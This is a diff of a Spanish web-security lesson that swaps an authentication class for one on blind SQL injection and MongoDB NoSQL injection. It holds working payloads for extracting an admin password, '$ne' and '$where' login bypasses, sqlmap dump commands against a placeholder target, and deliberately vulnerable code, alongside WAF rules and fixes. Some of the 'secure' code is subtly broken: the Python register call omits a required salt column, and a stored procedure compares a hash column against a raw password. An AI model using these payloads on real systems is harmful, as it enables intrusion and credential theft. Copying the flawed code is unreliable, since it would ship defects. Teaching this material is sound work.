@@ -1,4 +1,4 @@
-# Clase 17: Autenticacion y Gestion de Sesiones
+# Clase 17: Inyeccion SQL Avanzada y NoSQL
 
 **Duracion:** 2 horas
 
@@ -6,243 +6,263 @@
 
 ## Objetivos de Aprendizaje
 
-1. Identificar problemas comunes de autenticacion en aplicaciones web
-2. Implementar almacenamiento seguro de contrasenas con algoritmos modernos
-3. Comprender y gestionar sesiones de usuario con JWT y cookies seguras
-4. Conocer los principios de MFA y las mejores practicas de OWASP
+1. Comprender y ejecutar tecnicas de inyeccion SQL a ciegas (Blind SQL)
+2. Diferenciar entre Blind SQL basada en booleanos y basada en tiempo
+3. Identificar y explotar inyeccion NoSQL en MongoDB
+4. Implementar defensa en profundidad contra todo tipo de inyecciones
 
 ---
 
 ## Contenido Detallado
 
-### 1. Problemas Comunes de Autenticacion
+### 1. Inyeccion SQL a Ciegas (Blind SQL Injection)
 
-#### Credenciales Debiles
-- Contrasenas cortas o sin complejidad
-- Contrasenas por defecto (admin/admin, root/toor)
-- Reutilizacion de contrasenas entre servicios
+Ocurre cuando la aplicacion no muestra datos de la BD directamente, pero el comportamiento cambia segun si la consulta es verdadera o falsa.
 
-#### Fuerza Bruta (Brute Force)
-Ataque sistematico probando multiples combinaciones de usuario/contrasena.
+#### Blind SQL Basada en Booleanos
+
+El atacante envia preguntas de si/no y observa la respuesta de la aplicacion (carga diferente, mensaje de error diferente, redireccion diferente).
 
 ```
-Tasas de Ataque de Fuerza Bruta
-+------------------+------------------------+
-| Tipo             | Intentos por segundo   |
-+------------------+------------------------+
-| Manual           | 1-5                    |
-| Script basico    | 100-500                |
-| Botnet           | 10,000+                |
-| GPGPU (local)    | 1,000,000,000+ (hash) |
-+------------------+------------------------+
+Consulta original:  SELECT * FROM productos WHERE id = 1
+Respuesta:          Muestra producto normal
+
+Consulta inyectada: SELECT * FROM productos WHERE id = 1 AND 1=1
+Respuesta:          Misma respuesta (siempre verdadero)
+
+Consulta inyectada: SELECT * FROM productos WHERE id = 1 AND 1=2
+Respuesta:          No muestra nada (siempre falso)
+
+Diferencia:         La app es vulnerable a Blind SQL!
 ```
 
-#### Credenciales por Defecto
-Dispositivos y software que mantienen credenciales de fabrica sin cambios.
+**Extrayendo datos caracter por caracter:**
 
-| Dispositivo  | Usuario  | Contrasena |
-|-------------|----------|------------|
-| Router TP-Link | admin | admin |
-| Camara IP Hikvision | admin | 12345 |
-| MySQL | root | (vacia) |
-| Tomcat | admin | admin |
+```sql
+-- ?La primera letra del password del admin es 'a'?
+SELECT * FROM productos WHERE id = 1 AND
+    SUBSTRING((SELECT password FROM usuarios WHERE username='admin'), 1, 1) = 'a'
 
-#### Session Hijacking
-Robo del identificador de sesion de un usuario para suplantarlo.
+-- Si muestra producto: la letra es 'a'
+-- Si no muestra: no es 'a', probar 'b', 'c', etc.
 
-```
-Metodos comunes de session hijacking:
-1. Sniffing de trafico no cifrado
-2. XSS para robar cookies
-3. Prediccion de ID de sesion
-4. Session fixation
-5. Ataque a la red local (ARP spoofing)
+-- ?El password tiene mas de 5 caracteres?
+SELECT * FROM productos WHERE id = 1 AND
+    LENGTH((SELECT password FROM usuarios WHERE username='admin')) > 5
 ```
 
-### 2. Almacenamiento Seguro de Contrasenas
+**Proceso completo de extraccion:**
+1. Determinar longitud del valor: preguntar > 1, > 2, > 3... hasta encontrar el limite
+2. Extraer caracter 1: probar 'a', 'b', 'c'... hasta encontrar match
+3. Repetir para cada caracter hasta la longitud total
 
-#### Hashing vs. Encriptacion
+#### Blind SQL Basada en Tiempo (Time-based)
 
-```
-HASHING (unidireccional):
-password + salt --> hash_function --> hash_value
-Hash -> password: IMPOSIBLE (funcion de un solo sentido)
+Cuando la app no muestra diferencias en la respuesta (misma pagina, mismos errores), se usa retardos provocados por funciones como SLEEP(), WAITFOR DELAY, pg_sleep.
 
-ENCRIPTACION (bidireccional):
-password + clave --> encrypt_function --> ciphertext
-ciphertext + clave --> decrypt_function --> password
-```
+```sql
+-- MySQL
+SELECT * FROM productos WHERE id = 1 AND IF(1=1, SLEEP(5), 0)
 
-| Caracteristica | Hashing | Encriptacion |
-|---------------|---------|-------------|
-| Direccion | Un solo sentido | Reversible |
-| Uso en passwords | SI (almacenar verificacion) | NO (necesita clave secreta) |
-| Clave necesaria? | No (usa salt) | Si (clave de cifrado) |
-| Seguridad para passwords | Alta (si el algoritmo es bueno) | Baja (si roban clave, ven todos) |
+-- SQL Server
+SELECT * FROM productos WHERE id = 1; WAITFOR DELAY '0:0:5'
 
-#### Algoritmos Recomendados
+-- PostgreSQL
+SELECT * FROM productos WHERE id = 1 AND pg_sleep(5)
 
-| Algoritmo | Tipo | Iteraciones | Recomendado? |
-|-----------|------|-------------|-------------|
-| MD5 | Hash | 1 | NO (colisiones conocidas, 2^0.5s) |
-| SHA-1 | Hash | 1 | NO (colisiones demostradas 2017) |
-| SHA-256/512 | Hash | 1 | NO para passwords (muy rapido para GPU) |
-| **bcrypt** | Slow hash | 10-14 | **SI** (diseno especifico para passwords) |
-| **PBKDF2** | Slow hash | 310,000+ | **SI** (recomendado por NIST) |
-| **Argon2** | Slow hash | variable | **SI** (ganador PHC 2015, el mas moderno) |
-
-#### bcrypt en detalle
-
-bcrypt incluye automaticamente el salt en el output, no necesita almacenamiento separado.
-
-```python
-import bcrypt
-
-# Hash de contrasena
-password = b"MiPasswordSegura123"
-salt = bcrypt.gensalt(rounds=12)  # rounds=12 es un buen balance
-hashed = bcrypt.hashpw(password, salt)
-
-print(f"Hash: {hashed}")
-# Output: b'$2b$12$Qx4u7Y9yR3zS2wV5kL8j6O5m2n3p4q5r6s7t8u9v0w1x2y3z4A5B6C'
-
-# Verificacion
-if bcrypt.checkpw(password, hashed):
-    print("Contrasena correcta!")
+-- ?La primera letra del password es 'a'?
+SELECT * FROM productos WHERE id = 1 AND
+    IF(SUBSTRING((SELECT password FROM usuarios WHERE username='admin'),1,1)='a',
+       SLEEP(5), 0)
+-- Si tarda 5 segundos: la letra es 'a'
+-- Si responde inmediato: no es 'a'
 ```
 
-#### Almacenamiento Seguro
-```
-NUNCA almacenar:
-- Contrasenas en texto plano
-- Contrasenas en logs
-- Contrasenas en archivos de configuracion
-- Contrasenas cifradas (en vez de hasheadas)
+### 2. Inyeccion NoSQL en MongoDB
 
-SIEMPRE almacenar:
-- Hash de la contrasena + salt (bcrypt/Argon2)
-- En columna separada de la base de datos
-- Con los menores privilegios de acceso posibles
-```
+MongoDB usa un lenguaje de consulta basado en JSON/BSON. Las inyecciones ocurren cuando los parametros del usuario se concatenan directamente en las consultas.
 
-### 3. Gestion de Sesiones
+#### Como funciona MongoDB
 
-#### Tokens JWT (JSON Web Tokens)
+```javascript
+// Consulta normal en MongoDB
+db.usuarios.find({ username: "admin", password: "secreto" })
 
-JWT es un estandar abierto (RFC 7519) para transmitir informacion entre partes como un objeto JSON compacto y autónomo.
-
-**Estructura de un JWT:**
-
-```
-Header.Payload.Signature
+// Operadores especiales
+db.usuarios.find({ username: "admin", password: { $ne: "" } })
+// $ne = not equal -> devuelve cualquier usuario cuyo password no este vacio
 ```
 
+#### Inyeccion en Consultas con String Concatenation
+
+**Vulnerable (Node.js):**
+```javascript
+const username = req.body.username;
+const password = req.body.password;
+
+// VULNERABLE: concatenacion en string JSON
+const query = `{ username: '${username}', password: '${password}' }`;
+db.collection('usuarios').find(JSON.parse(query)).toArray((err, users) => {
+    if (users.length > 0) {
+        // Login exitoso!
+    }
+});
 ```
-HEADER:
+
+**Explotacion:**
+```
+Enviar como username: admin
+Enviar como password: $ne}  (cierra el JSON y anade operador)
+El JSON resultante:   { username: 'admin', password: '$ne'}  }
+
+Pero mejor, explotar la inyeccion directa:
+
+username = admin
+password = { "$ne": "" }
+
+Si no hay validacion de tipos, se pasa objeto directamente:
+query = { username: 'admin', password: { "$ne": "" } }
+```
+
+**Explotacion tipica en APIs REST:**
+```json
+// Peticion POST a /api/login
+// Payload malicioso:
 {
-  "alg": "HS256",
-  "typ": "JWT"
+    "username": "admin",
+    "password": { "$ne": "" }
 }
 
-PAYLOAD:
-{
-  "sub": "1234567890",
-  "name": "Juan Perez",
-  "iat": 1516239022,
-  "exp": 1516242622,
-  "role": "admin"
-}
-
-SIGNATURE:
-HMACSHA256(
-  base64UrlEncode(header) + "." +
-  base64UrlEncode(payload),
-  secret_key
-)
+// Consulta generada:
+db.usuarios.findOne({
+    "username": "admin",
+    "password": { "$ne": "" }
+})
+// Devuelve admin si existe (bypass de autenticacion)
 ```
 
-**JWT en formato string:**
+#### Inyeccion $where
+
+El operador `$where` permite ejecutar JavaScript arbitrario en la BD.
+
+```javascript
+// VULNERABLE
+db.usuarios.find({ $where: "this.username == '" + username + "'" });
+
+// Explotacion
+username = "' || true || '"
+// Resultado: this.username == '' || true || ''
+// Devuelve todos los usuarios!
+
+// RCE via $where
+username = "'; return 'a' == 'a"
+// O incluso inyectar codigo mas complejo
 ```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
-eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikp1YW4gUGVyZXoiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.
-SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+### 3. Herramientas: SQLMap
+
+SQLMap es la herramienta mas popular para detectar y explotar automaticamente inyecciones SQL.
+
+**Uso basico:**
+```bash
+# Detectar si una URL es vulnerable
+sqlmap -u "http://target.com/producto.php?id=1"
+
+# Con cookie de sesion
+sqlmap -u "http://target.com/producto.php?id=1" --cookie="session=abc123"
+
+# Extraer bases de datos
+sqlmap -u "http://target.com/producto.php?id=1" --dbs
+
+# Extraer tablas de una BD
+sqlmap -u "http://target.com/producto.php?id=1" -D nombre_bd --tables
+
+# Extraer datos de una tabla
+sqlmap -u "http://target.com/producto.php?id=1" -D nombre_bd -T usuarios --dump
+
+# Modo de riesgo alto
+sqlmap -u "http://target.com/producto.php?id=1" --level=5 --risk=3
 ```
 
-#### Cookies Seguras
+**Flags importantes:**
+- `--level`: Profundidad de pruebas (1-5, default 1)
+- `--risk`: Riesgo de pruebas (1-3, default 1)
+- `--technique`: Tecnica especifica (B: Boolean, T: Time, E: Error, U: Union, S: Stacked)
+- `--threads`: Hilos para acelerar
+- `--batch`: Modo no interactivo
+- `--dump-all`: Extraer todo
 
-| Atributo | Significado | Recomendacion |
-|----------|------------|--------------|
-| **HttpOnly** | No accesible desde JavaScript | SIEMPRE (previene XSS robo de cookies) |
-| **Secure** | Solo se envia por HTTPS | SIEMPRE |
-| **SameSite** | Controla envio cross-site | `Strict` o `Lax` (previene CSRF) |
-| **Path** | Limita ruta de envio | Especifico (/api) |
-| **Domain** | Limita dominio | Sin comodin si es posible |
-| **Max-Age/Expires** | Tiempo de vida | 15-60 min para sesion, mas para recuerdame |
+**Demo educativa:**
+```bash
+# Probar con parametro POST
+sqlmap -u "http://testapp.com/login" --data="username=admin&password=test"
 
-#### OWASP Session Management Cheat Sheet
+# Blind SQL time-based
+sqlmap -u "http://testapp.com/producto.php?id=1" --technique=T --time-sec=3
+```
 
-Recomendaciones clave:
+### 4. Defensa en Profundidad contra Inyecciones
 
-1. **Generar IDs de sesion con fuentes seguras:** `crypto.randomBytes()` en Node, `secrets.token_hex()` en Python
-2. **Longitud minima de 128 bits** para el identificador
-3. **Expiracion de sesion:** Inactividad (15-30 min), absoluta (8-24 horas)
-4. **Regenerar ID de sesion** despues del login exitoso (previene session fixation)
-5. **Invalidar sesion** al logout (servidor y cliente)
-6. **No exponer ID en URLs** (usar cookies HttpOnly)
-7. **Almacen del lado seguro** (no confiar en datos del cliente sin verificar)
+```
+CAPAS DE DEFENSA
++----------------------------------------------------------+
+|  Capa 1: Prepared Statements/Parametrizacion (obligatorio)|
++----------------------------------------------------------+
+|  Capa 2: Validacion de entrada (whitelist)                |
++----------------------------------------------------------+
+|  Capa 3: ORM con configuracion segura                     |
++----------------------------------------------------------+
+|  Capa 4: WAF (ModSecurity, Cloudflare)                    |
++----------------------------------------------------------+
+|  Capa 5: Minimo privilegio en BD                          |
++----------------------------------------------------------+
+|  Capa 6: Monitoreo y logging                              |
++----------------------------------------------------------+
+```
 
-### 4. MFA (Multi-Factor Authentication)
+**Stored Procedures (con parametros):**
+```sql
+CREATE PROCEDURE sp_login
+    @username NVARCHAR(50),
+    @password NVARCHAR(50)
+AS
+BEGIN
+    SELECT * FROM usuarios WHERE username = @username AND password_hash = @password
+END
+```
 
-Factores de autenticacion:
+**WAF Reglas (ModSecurity):**
+```apache
+# Prevenir inyeccion SQL
+SecRule REQUEST_COOKIES|REQUEST_HEADERS|ARGS "@detectSQLi" \
+    "id:942100,severity:CRITICAL,block,msg:'SQL Injection Detected'"
 
-| Factor | Ejemplo | Descripcion |
-|--------|---------|-------------|
-| Algo que sabes | Contrasena, PIN | Conocimiento |
-| Algo que tienes | Telefono, token fisico, tarjeta | Posesion |
-| Algo que eres | Huella dactilar, reconocimiento facial | Herencia |
-
-**TOTP (Time-based One-Time Password):**
-```python
-import pyotp
-import qrcode
-
-# Generar secreto
-secret = pyotp.random_base32()
-print(f"Secreto: {secret}")
-# 'JBSWY3DPEHPK3PXP'
-
-# Generar codigo TOTP (valido 30 segundos)
-totp = pyotp.TOTP(secret)
-codigo = totp.now()
-print(f"Codigo actual: {codigo}")
-
-# Verificar
-print(totp.verify(codigo))        # True
-print(totp.verify("000000"))      # False
+# Prevenir inyeccion NoSQL
+SecRule REQUEST_BODY "@detectNoSQLi" \
+    "id:942200,severity:CRITICAL,block,msg:'NoSQL Injection Detected'"
 ```
 
 ---
 
-## Ejercicio 1: Registro y Login con Flask + bcrypt
+## Ejercicio 1: Login Seguro con Parametros (Python + SQLite)
+
+Crear un script completo de login seguro con las siguientes caracteristicas:
+- Registro de usuarios con contrasena hasheada (bcrypt)
+- Login con consultas parametrizadas
+- Proteccion contra fuerza bruta (limite de intentos)
+- Mensajes de error genericos
+- Logging de intentos sin datos sensibles
 
 ```python
-# app.py - Aplicacion Flask con autenticacion segura
 import sqlite3
-from flask import Flask, request, jsonify, session, make_response
-import bcrypt
-import secrets
-from datetime import datetime, timedelta
+import hashlib
+import os
+import time
 import re
 
-app = Flask(__name__)
-# Usar una clave secreta segura, no hardcodeada en produccion
-app.config['SECRET_KEY'] = secrets.token_hex(32)
-app.config['SESSION_COOKIE_HTTPONLY'] = True
-app.config['SESSION_COOKIE_SECURE'] = True     # Solo HTTPS
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
-app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
-
-DB_PATH = 'users.db'
+DB_PATH = 'safe_login.db'
+MAX_ATTEMPTS = 5
+LOCKOUT_TIME = 300  # 5 minutos en segundos
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -250,297 +270,353 @@ def init_db():
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS usuarios (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            email TEXT UNIQUE NOT NULL,
             username TEXT UNIQUE NOT NULL,
             password_hash TEXT NOT NULL,
-            mfa_secret TEXT,
+            salt TEXT NOT NULL,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS login_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            attempt_time INTEGER NOT NULL,
+            success INTEGER NOT NULL,
+            ip_address TEXT
         )
     ''')
     conn.commit()
     conn.close()
 
-def get_db():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
-
-def validate_email(email):
-    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-    return re.match(pattern, email) is not None
-
-def validate_password(password):
-    """Validar: min 8 chars, 1 mayuscula, 1 minuscula, 1 numero"""
-    if len(password) < 8:
-        return False
-    if not re.search(r'[A-Z]', password):
-        return False
-    if not re.search(r'[a-z]', password):
-        return False
-    if not re.search(r'[0-9]', password):
-        return False
-    return True
-
-# --- Endpoints ---
-
-@app.route('/api/register', methods=['POST'])
-def register():
-    data = request.get_json()
-    if not data:
-        return jsonify({'error': 'Datos requeridos'}), 400
-
-    username = data.get('username', '').strip()
-    email = data.get('email', '').strip()
-    password = data.get('password', '')
-
-    # Validaciones
-    if not username or len(username) < 3:
-        return jsonify({'error': 'Username debe tener al menos 3 caracteres'}), 400
-    if not validate_email(email):
-        return jsonify({'error': 'Email invalido'}), 400
-    if not validate_password(password):
-        return jsonify({'error': 'Password debe tener 8+ caracteres, mayuscula, minuscula y numero'}), 400
-
-    # Hash de contrasena con bcrypt
-    password_hash = bcrypt.hashpw(
+def hash_password(password, salt=None):
+    if salt is None:
+        salt = os.urandom(32).hex()
+    # PBKDF2 con SHA-256 (similar a como funciona internamente bcrypt)
+    pwd_hash = hashlib.pbkdf2_hmac(
+        'sha256',
         password.encode('utf-8'),
-        bcrypt.gensalt(rounds=12)
-    ).decode('utf-8')
+        salt.encode('utf-8'),
+        100000  # 100,000 iteraciones
+    ).hex()
+    return f"{salt}${pwd_hash}"
+
+def verify_password(password, stored_hash):
+    salt, pwd_hash = stored_hash.split('$')
+    return hash_password(password, salt) == stored_hash
+
+def is_locked_out(username):
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    current_time = int(time.time())
+    lockout_time = current_time - LOCKOUT_TIME
+
+    cursor.execute('''
+        SELECT COUNT(*) FROM login_attempts
+        WHERE username = ? AND attempt_time > ? AND success = 0
+    ''', (username, lockout_time))
+
+    count = cursor.fetchone()[0]
+    conn.close()
+    return count >= MAX_ATTEMPTS
+
+def register(username, password):
+    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
+        return "Error: Username debe tener 3-20 caracteres alfanumericos"
+
+    if len(password) < 8:
+        return "Error: Password debe tener al menos 8 caracteres"
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
 
     try:
-        conn = get_db()
-        cursor = conn.cursor()
+        pwd_hash = hash_password(password)
         cursor.execute(
-            "INSERT INTO usuarios (email, username, password_hash) VALUES (?, ?, ?)",
-            (email, username, password_hash)
+            "INSERT INTO usuarios (username, password_hash) VALUES (?, ?)",
+            (username, pwd_hash)
         )
         conn.commit()
-        return jsonify({'message': 'Usuario registrado exitosamente'}), 201
-    except sqlite3.IntegrityError as e:
-        return jsonify({'error': 'El usuario o email ya existe'}), 409
+        return "Usuario registrado exitosamente"
+    except sqlite3.IntegrityError:
+        return "Error: El usuario ya existe"
     finally:
         conn.close()
 
-@app.route('/api/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    if not data:
-        return jsonify({'error': 'Datos requeridos'}), 400
+def login(username, password):
+    # Verificar lockout
+    if is_locked_out(username):
+        return "Cuenta temporalmente bloqueada. Intente en 5 minutos."
 
-    username = data.get('username', '').strip()
-    password = data.get('password', '')
-
-    conn = get_db()
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
-    # Consulta parametrizada (segura contra inyeccion SQL)
+    # Consulta parametrizada (segura contra SQLi)
     cursor.execute(
-        "SELECT id, username, password_hash FROM usuarios WHERE username = ?",
+        "SELECT password_hash FROM usuarios WHERE username = ?",
         (username,)
     )
-    user = cursor.fetchone()
-    conn.close()
+    result = cursor.fetchone()
 
-    if not user:
-        return jsonify({'error': 'Credenciales invalidas'}), 401
+    current_time = int(time.time())
 
-    # Verificar contrasena con bcrypt
-    stored_hash = user['password_hash'].encode('utf-8')
-    if bcrypt.checkpw(password.encode('utf-8'), stored_hash):
-        # Regenerar sesion (previene session fixation)
-        session.clear()
-        session.permanent = True
-        session['user_id'] = user['id']
-        session['username'] = user['username']
-
-        return jsonify({
-            'message': 'Login exitoso',
-            'user': {'id': user['id'], 'username': user['username']}
-        }), 200
+    if result and verify_password(password, result[0]):
+        # Login exitoso
+        cursor.execute(
+            "INSERT INTO login_attempts (username, attempt_time, success) VALUES (?, ?, 1)",
+            (username, current_time)
+        )
+        conn.commit()
+        conn.close()
+        return "Login exitoso. Bienvenido!"
     else:
-        return jsonify({'error': 'Credenciales invalidas'}), 401
+        # Login fallido - registrar intento
+        cursor.execute(
+            "INSERT INTO login_attempts (username, attempt_time, success) VALUES (?, ?, 0)",
+            (username, current_time)
+        )
+        conn.commit()
+        conn.close()
+        return "Credenciales invalidas"  # Mensaje generico, no revela que fallo
 
-@app.route('/api/logout', methods=['POST'])
-def logout():
-    # Invalidar sesion
-    session.clear()
-    response = jsonify({'message': 'Sesion cerrada'})
-    # Eliminar cookie de sesion del cliente
-    response.set_cookie('session', '', expires=0)
-    return response, 200
-
-@app.route('/api/perfil', methods=['GET'])
-def perfil():
-    # Verificar autenticacion
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
-
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute(
-        "SELECT id, username, email, created_at FROM usuarios WHERE id = ?",
-        (session['user_id'],)
-    )
-    user = cursor.fetchone()
-    conn.close()
-
-    if not user:
-        session.clear()
-        return jsonify({'error': 'Usuario no encontrado'}), 404
-
-    return jsonify({
-        'id': user['id'],
-        'username': user['username'],
-        'email': user['email'],
-        'created_at': user['created_at']
-    }), 200
-
-if __name__ == '__main__':
+# Demo
+if __name__ == "__main__":
     init_db()
-    # En produccion: usar HTTPS, debug=False
-    app.run(debug=False, host='0.0.0.0', port=5000)
+
+    # Registrar usuario
+    print(register("admin", "MiPasswordSegura123!"))
+
+    # Login correcto
+    print(login("admin", "MiPasswordSegura123!"))
+
+    # Login incorrecto (intento de inyeccion SQL)
+    print(login("admin", "' OR '1'='1"))  # No bypassea, busca como literal
+
+    # Probar lockout por fuerza bruta
+    for i in range(5):
+        result = login("admin", "wrongpass")
+        print(f"Intento {i+1}: {result}")
+    # El sexto intento deberia estar bloqueado
+    print(login("admin", "MiPasswordSegura123!"))  # Bloqueado
 ```
 
-### Explicacion del codigo:
+### Explicacion de la Solucion
 
-1. **bcrypt:** Se usa `gensalt(rounds=12)` - 2^12 = 4096 iteraciones, balance seguridad/rendimiento
-2. **Sesiones seguras:** Cookies con HttpOnly, Secure, SameSite=Lax
-3. **Regeneracion de sesion:** Se llama a `session.clear()` antes de establecer datos de sesion en login
-4. **Politica de contrasenas:** 8+ caracteres, mayuscula, minuscula, numero
-5. **Consultas parametrizadas:** Todas las operaciones SQL usan `?` placeholders
-6. **Mensajes genericos:** No revelar si el usuario existe ("Credenciales invalidas")
-7. **Validacion de email:** Expresion regular para formato basico
+1. **Parametrizacion:** Todas las consultas SQL usan `?` placeholders
+2. **Hashing:** Se usa PBKDF2 con SHA-256, salt unico de 32 bytes, 100,000 iteraciones
+3. **Lockout:** 5 intentos fallidos bloquean por 5 minutos
+4. **Mensajes genericos:** No se revela si el usuario existe o no
+5. **Logging:** Se registran todos los intentos con timestamp
+6. **Validacion de username:** Solo caracteres alfanumericos y guion bajo
 
 ---
 
-## Ejercicio 2: Analisis de Token JWT
+## Ejercicio 2: Migrar Codigo MongoDB Vulnerable a Parametros Seguros
 
-**Token dado:**
-```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
-eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikp1YW4gUGVyZXoiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAzNjAwfQ.
-kQk7X5mN2z8L6y2sY5w9K4p3n2m1b6c5d4e3f2g1h0i9j8k7l6m5n4o3p2
-```
+**Codigo vulnerable:**
+```javascript
+// VULNERABLE: Node.js + MongoDB
+const express = require('express');
+const MongoClient = require('mongodb').MongoClient;
 
-### Analisis paso a paso:
+app.post('/api/login', async (req, res) => {
+    const { username, password } = req.body;
+    const db = await MongoClient.connect('mongodb://localhost:27017/mydb');
 
-**Paso 1: Decodificar Header**
-```python
-import base64
-import json
+    // VULNERABLE: concatenacion directa
+    const query = `{ "username": "${username}", "password": "${password}" }`;
+    const user = await db.collection('usuarios').findOne(JSON.parse(query));
 
-def decode_base64url(s):
-    padding = 4 - len(s) % 4
-    if padding != 4:
-        s += '=' * padding
-    return base64.urlsafe_b64decode(s)
-
-header_b64 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
-header = json.loads(decode_base64url(header_b64))
-print(json.dumps(header, indent=2))
-# {
-#   "alg": "HS256",      # HMAC con SHA-256
-#   "typ": "JWT"         # Tipo: JWT
-# }
+    if (user) {
+        res.json({ success: true, token: generateToken(user) });
+    } else {
+        res.json({ success: false, message: 'Credenciales invalidas' });
+    }
+});
 ```
 
-**Paso 2: Decodificar Payload**
-```python
-payload_b64 = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikp1YW4gUGVyZXoiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAzNjAwfQ"
-payload = json.loads(decode_base64url(payload_b64))
-print(json.dumps(payload, indent=2))
-# {
-#   "sub": "1234567890",    # Subject (ID del usuario)
-#   "name": "Juan Perez",   # Nombre
-#   "role": "user",         # Rol (user/admin)
-#   "iat": 1700000000,      # Issued At (fecha emision)
-#   "exp": 1700003600       # Expiration (fecha expiracion, 1 hora despues)
-# }
+**Codigo corregido con parametros seguros:**
+```javascript
+const express = require('express');
+const MongoClient = require('mongodb').MongoClient;
+const bcrypt = require('bcrypt');
+const crypto = require('crypto');
+
+const app = express();
+app.use(express.json());  // Importante: parsear JSON correctamente
+
+// Conexion con configuracion segura
+const DB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/mydb';
+
+function sanitizeInput(input) {
+    if (typeof input !== 'string') {
+        return '';
+    }
+    // Remover caracteres que podrian usarse en inyeccion NoSQL
+    return input.replace(/[\$\{\}\(\)]/g, '');
+}
+
+function generateToken(user) {
+    return crypto.randomBytes(32).toString('hex');
+}
+
+app.post('/api/login', async (req, res) => {
+    try {
+        const { username, password } = req.body;
+
+        // Validar que sean strings
+        if (typeof username !== 'string' || typeof password !== 'string') {
+            return res.status(400).json({
+                success: false,
+                message: 'Credenciales invalidas'
+            });
+        }
+
+        // Sanitizar (capa adicional)
+        const safeUsername = sanitizeInput(username);
+
+        // Usar el driver de MongoDB con parametros (NO concatenacion)
+        const client = await MongoClient.connect(DB_URI);
+        const db = client.db();
+
+        // SEGURO: pasar valores como propiedades, NO como string JSON
+        const user = await db.collection('usuarios').findOne({
+            username: safeUsername
+        });
+
+        if (user && await bcrypt.compare(password, user.passwordHash)) {
+            const token = generateToken(user);
+            await db.collection('sesiones').insertOne({
+                userId: user._id,
+                token: token,
+                createdAt: new Date(),
+                expiresAt: new Date(Date.now() + 3600000) // 1 hora
+            });
+
+            client.close();
+            return res.json({
+                success: true,
+                token: token
+            });
+        }
+
+        client.close();
+        return res.status(401).json({
+            success: false,
+            message: 'Credenciales invalidas'
+        });
+
+    } catch (error) {
+        console.error('Error en login:', error.message);
+        return res.status(500).json({
+            success: false,
+            message: 'Error interno del servidor'
+        });
+    }
+});
+
+// Registro seguro
+app.post('/api/register', async (req, res) => {
+    try {
+        const { username, password } = req.body;
+
+        if (typeof username !== 'string' || typeof password !== 'string') {
+            return res.status(400).json({
+                success: false,
+                message: 'Datos invalidos'
+            });
+        }
+
+        if (password.length < 8) {
+            return res.status(400).json({
+                success: false,
+                message: 'Password debe tener al menos 8 caracteres'
+            });
+        }
+
+        const safeUsername = sanitizeInput(username);
+        const saltRounds = 12;
+        const passwordHash = await bcrypt.hash(password, saltRounds);
+
+        const client = await MongoClient.connect(DB_URI);
+        const db = client.db();
+
+        // SEGURO: parametros como objeto, no string
+        await db.collection('usuarios').insertOne({
+            username: safeUsername,
+            passwordHash: passwordHash,
+            createdAt: new Date()
+        });
+
+        client.close();
+        return res.status(201).json({
+            success: true,
+            message: 'Usuario registrado'
+        });
+
+    } catch (error) {
+        if (error.code === 11000) { // Duplicate key
+            return res.status(409).json({
+                success: false,
+                message: 'El usuario ya existe'
+            });
+        }
+        console.error('Error en registro:', error.message);
+        return res.status(500).json({
+            success: false,
+            message: 'Error interno del servidor'
+        });
+    }
+});
 ```
 
-**Paso 3: Verificar Firma**
-```python
-import hmac
-import hashlib
+### Principios aplicados en la correccion:
 
-signature_b64 = "kQk7X5mN2z8L6y2sY5w9K4p3n2m1b6c5d4e3f2g1h0i9j8k7l6m5n4o3p2"
-
-# Calcular firma esperada (necesitamos la clave secreta)
-secret_key = "mi_clave_secreta_super_segura"
-message = f"{header_b64}.{payload_b64}"
-expected_signature = hmac.new(
-    secret_key.encode('utf-8'),
-    message.encode('utf-8'),
-    hashlib.sha256
-).digest()
-
-expected_b64 = base64.urlsafe_b64encode(expected_signature).rstrip('=').decode('utf-8')
-
-print(f"Firma dada:      {signature_b64}")
-print(f"Firma esperada:  {expected_b64}")
-print(f"Firma valida:    {signature_b64 == expected_b64}")
-```
-
-**Paso 4: Verificar Claims de Seguridad**
-- **iat:** 1700000000 -> Fecha emision: 2023-11-14 (fecha pasada)
-- **exp:** 1700003600 -> Fecha expiracion: 2023-11-14 + 1h
-- La expiracion debe verificarse: si `time.time() > exp`, rechazar token
-- El **rol es "user"**, pero deberia validarse contra la BD
-- El token NO tiene `nbf` (Not Before) ni `jti` (JWT ID)
-
-**Paso 5: Ataque potencial - None Algorithm**
-Si el servidor acepta `"alg": "none"`, el atacante puede modificar el header:
-```json
-// Header modificado
-{ "alg": "none", "typ": "JWT" }
-
-// Cualquier payload con role: admin
-{ "sub": "123", "name": "Juan Perez", "role": "admin", "iat": 1700000000, "exp": 9999999999 }
-
